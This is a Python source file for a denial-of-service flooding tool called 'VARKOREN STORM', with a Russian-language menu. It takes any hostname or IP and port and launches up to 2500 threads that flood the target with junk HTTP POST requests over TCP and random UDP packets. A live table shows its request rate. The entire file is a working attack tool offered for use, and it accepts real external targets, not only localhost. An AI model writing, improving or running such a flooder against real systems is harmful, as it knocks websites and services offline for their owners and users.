import socket
import threading
import os
import random
import time
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel

console = Console()
stats = {"success": 0, "errors": 0, "rps": 0, "power": "Medium", "target": "127.0.0.1"}


def get_banner():
    return """
[bold red]
██╗   ██╗ █████╗ ██████╗ ██╗  ██╗ ██████╗ ██████╗ ███████╗███╗   ██╗
██║   ██║██╔══██╗██╔══██╗██║ ██╔╝██╔═══██╗██╔══██╗██╔════╝████╗  ██║
██║   ██║███████║██████╔╝█████╔╝ ██║   ██║██████╔╝█████╗  ██╔██╗ ██║
╚██╗ ██╔╝██╔══██║██╔══██╗██╔═██╗ ██║   ██║██╔══██╗██╔══╝  ██║╚██╗██║
 ╚████╔╝ ██║  ██║██║  ██║██║  ██╗╚██████╔╝██║  ██║███████╗██║ ╚████║
  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
[/bold red]
    """


def tcp_attack(target_ip, target_port, weight):
    payload = (f"POST /?v={random.getrandbits(32)} HTTP/1.1\r\n"
               f"Host: {target_ip}\r\n"
               f"Content-Length: {weight}\r\n"
               f"User-Agent: VARKOREN-STORM\r\n\r\n" + "X" * weight).encode()
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            s.connect((target_ip, target_port))
            s.sendall(payload)
            stats["success"] += 1
            s.close()
        except:
            stats["errors"] += 1
        time.sleep(0.0001)


def udp_attack(target_ip, target_port, weight):
    payload = random._urandom(weight)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(payload, (target_ip, target_port))
            stats["success"] += 1
        except:
            stats["errors"] += 1
        time.sleep(0.0001)


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print(get_banner())

    # Выбор цели
    console.print("[bold yellow]Выберите тип цели:[/bold yellow]")
    console.print("[1] Localhost (127.0.0.1:5500)")
    console.print("[2] Ввести ссылку или IP (напр. mysite.com или 1.1.1.1)")

    t_choice = input("\nВыбор > ")

    target_ip = "127.0.0.1"
    target_port = 5500

    if t_choice == "2":
        raw_target = input("Введите адрес (без http://): ")
        try:
            # Магия превращения ссылки в IP
            target_ip = socket.gethostbyname(raw_target)
            target_port = int(input("Введите порт (обычно 80 или 443): "))
            console.print(f"[bold green]IP цели определен: {target_ip}[/bold green]")
        except:
            console.print("[bold red]Ошибка: Неверный адрес! Использую 127.0.0.1[/bold red]")
            time.sleep(2)

    stats["target"] = target_ip

    console.print("\n[bold yellow]Выберите уровень мощности:[/bold yellow]")
    console.print("[1] LOW | [2] MEDIUM | [3] OVERLOAD | [4] ULTIMATE")

    p_choice = input("\nМощность > ")

    if p_choice == "4":
        threads, weight, stats["power"] = 2500, 16384, "ULTIMATE"
    elif p_choice == "3":
        threads, weight, stats["power"] = 1500, 8192, "OVERLOAD"
    elif p_choice == "2":
        threads, weight, stats["power"] = 800, 4096, "Medium"
    else:
        threads, weight, stats["power"] = 300, 1024, "Low"

    for i in range(threads):
        target_func = tcp_attack if i % 2 == 0 else udp_attack
        threading.Thread(target=target_func, args=(target_ip, target_port, weight), daemon=True).start()

    last_s = 0
    with Live(auto_refresh=True) as live:
        while True:
            curr_s = stats["success"]
            stats["rps"] = (curr_s - last_s) * 2.5
            last_s = curr_s
            table = Table(title=f"[bold red]VARKOREN STORM v6.4[/bold red]", border_style="red")
            table.add_column("Параметр", style="red"), table.add_column("Значение", style="bold white")
            table.add_row("Цель", stats["target"])
            table.add_row("Мощность", f"[blink bold red]{stats['power']}[/blink bold red]")
            table.add_row("RPS", f"{int(stats['rps']):,}")
            table.add_row("Успешно", f"{stats['success']:,}")
            table.add_row("Ошибки", f"{stats['errors']:,}")
            live.update(table)
            time.sleep(0.4)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[bold red]VARKOREN: OFF.[/bold red]")